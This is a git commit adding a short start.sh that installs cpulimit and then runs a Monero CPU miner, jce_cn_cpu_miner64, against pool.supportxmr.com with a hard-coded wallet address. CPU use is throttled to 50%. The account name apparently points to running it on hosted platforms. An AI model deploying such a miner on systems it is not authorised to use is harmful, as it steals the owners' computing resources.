7c5acf952a1e6034a2bcf14859d45c38e1feb02b
herokubash <40611244+herokubash@users.noreply.github.com>
2018-07-05 21:56:28 +0200

    Add files via upload

---
+++ start.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+chmod +x jce_cn_cpu_miner64
+sudo apt install cpulimit
+sudo sysctl -w vm.nr_hugepages=128
+cpulimit -e jce_cn_cpu_miner64 -l 50 -b
+./jce_cn_cpu_miner64 --any --forever --variation 3 --low -o pool.supportxmr.com:80 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p google  -c config.txt
